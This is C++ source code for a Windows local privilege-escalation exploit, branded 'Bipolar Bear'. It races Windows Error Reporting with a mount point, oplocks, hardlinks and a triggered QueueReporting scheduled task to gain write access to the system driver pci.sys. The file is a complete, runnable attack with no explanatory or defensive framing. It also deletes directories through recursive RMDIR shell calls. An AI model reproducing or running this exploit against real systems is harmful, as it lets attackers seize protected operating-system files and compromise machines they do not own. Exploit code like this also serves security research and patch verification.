#include <iostream>
#include "stdafx.h"
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <strsafe.h>
#include "FileOplock.h"
#include "ReparsePoint.h"
#include <random>
const char* targetfile;
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
bool triggered = false;
int random = 0;
bool secondthread = false;
int fileappend = 9999;
void UnlockFile()
{
	printf("oplock triggered\n");
	triggered = true;
}
DWORD WINAPI MyThreadFunction2(LPVOID lpParam)
{
	std::wstring path3 = L"c:\\blah\\1_1_1_1_1\\test";
	path3 += std::to_wstring(fileappend);
	const wchar_t* blah = path3.c_str();
	bool test = false;
	do {
		test = CreateNativeHardlink(blah, L"c:\\windows\\system32\\drivers\\pci.sys");
	} while (test == false);
	return 0;
}
DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	const wchar_t* werFilename = L"c:\\blah\\1_1_1_1_1\\report.wer";
	FileOpLock::CreateLock(werFilename, UnlockFile);
	secondthread = true;
	std::wstring path2 = L"c:\\blah\\2_2_2_2_2\\test";
	path2 += std::to_wstring(fileappend);
	const wchar_t* destFilename = path2.c_str();
	std::wstring path = L"c:\\blah\\1_1_1_1_1\\test";
	path += std::to_wstring(fileappend);
	const wchar_t* blah = path.c_str();
	auto destFilenameLength = wcslen(destFilename);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _alloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, destFilename, destFilenameLength);
	LARGE_INTEGER li;
	HANDLE fileHandle = CreateFile(blah, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	int count = 0;
	while (count < random)
	{
		count++;
		QueryPerformanceCounter(&li);
	}
	SetFileInformationByHandle(fileHandle, FileRenameInfo, fri, bufferSize);
	CloseHandle(fileHandle);
	return 0;
}
int main(int argc, const char * argv[])
{
	HANDLE hDir = CreateFileW(L"c:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue",GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,NULL);
	system("RMDIR \"c:\\blah\" / S / Q");
	CreateDirectory(L"c:\\blah", NULL);
	ReparsePoint::CreateMountPoint(hDir, L"C:\\blah", L"");
	std::cout << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶§§§§§§§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶§1``````````````11§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶1````````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶§```````````````````````````````§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶§```````````````````````````````````1§¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶§```````````````````````````````````````1§¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶``````````BIPOLAR BEAR`````````````````````1§¶¶¶¶¶¶//" << std::endl
		<< "//¶1`1`````````````````````````````````````````1`1¶¶¶¶¶//" << std::endl
		<< "//¶§¶¶§````````````````````````````````````````````1§¶¶//" << std::endl
		<< "//¶¶¶`§§```````````````````````````````````````````§¶¶¶//" << std::endl
		<< "//¶¶1``1§````````````````````````111§§¶¶¶¶¶¶§§§¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶````1§`````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶§``````§````````11`````````§§``1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶``````1¶¶```````¶¶¶¶1`````¶1````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶`````§¶¶¶¶1`````¶¶¶¶§````¶¶1````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//§````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶`````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶¶````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶111`11¶¶¶¶1``````1¶¶§````1§¶¶1````11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl;
	std::cout << std::endl << "---------------------------------BIPOLAR BEAR SALUTES YOU------------------------------------------------------------" << std::endl;
	Sleep(2000);
	HANDLE testhandle;
	int ClearTimer = 0;
	do {
		////////////////////////////////////////Clean-up routine/////////////////////////////////////////////////
		ClearTimer++;
		if(ClearTimer == 50)
		{
			std::cout << std::endl << "Attempting to clean up our stupid folder" << std::endl;
			Sleep(5000);
			CopyFile(L"report.wer", L"c:\\blah\\1_1_1_1_1\\report.wer", true);
			CopyFile(L"report.wer", L"c:\\blah\\2_2_2_2_2\\report.wer", true);
			system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
			Sleep(15000);
			system("RMDIR \"c:\\blah\\1_1_1_1_1\" /S /Q");
			system("RMDIR \"c:\\blah\\2_2_2_2_2\" /S /Q");
			ClearTimer = 0;
		}
		/////////////////////////////////////////////////////////////////////////////////////////////////////

		fileappend--;
		std::random_device rd;
		std::mt19937 gen(rd());
		std::uniform_int_distribution<> dis(10000, 70000);
		random = dis(gen);
		std::cout << "trying random delay:" << random << std::endl;
		std::wstring path = L"c:\\blah\\1_1_1_1_1\\test";
		path += std::to_wstring(fileappend);
		const wchar_t* blah = path.c_str();
		CreateDirectory(L"c:\\blah", NULL);
		triggered = false;
		CreateDirectory(L"c:\\blah\\2_2_2_2_2", NULL);
		CreateDirectory(L"c:\\blah\\1_1_1_1_1", NULL);
		HANDLE ew = CreateFile(blah, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(ew);
		CopyFile(L"report.wer", L"c:\\blah\\1_1_1_1_1\\report.wer", true);
		HANDLE mThread = CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);
		SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
		LARGE_INTEGER li;
		while(secondthread == false)
		{ 
			QueryPerformanceCounter(&li);
		}
		HANDLE mThread2 = CreateThread(NULL, 0, MyThreadFunction2, NULL, 0, NULL);
		secondthread = false;
		SetThreadPriority(mThread2, THREAD_PRIORITY_TIME_CRITICAL);
		system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
		int count = 0;
		while (triggered == false)
		{
			count++;
			if(count > 5000)
			{
				std::cout << std::endl << "canceling oplock" << std::endl;

				break;
			}
			Sleep(1);
		}
		//May need to increase this on slower computers..
		Sleep(500);
		testhandle = CreateFile(L"c:\\windows\\system32\\drivers\\pci.sys", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TerminateThread(mThread, 0);
		TerminateThread(mThread2, 0);
	}while (testhandle == INVALID_HANDLE_VALUE);
	std::cout << std::endl << "---------------------------------File owned by bipolar bear----------------------------------------------------------" << std::endl;
	getchar();
	return 0;
}
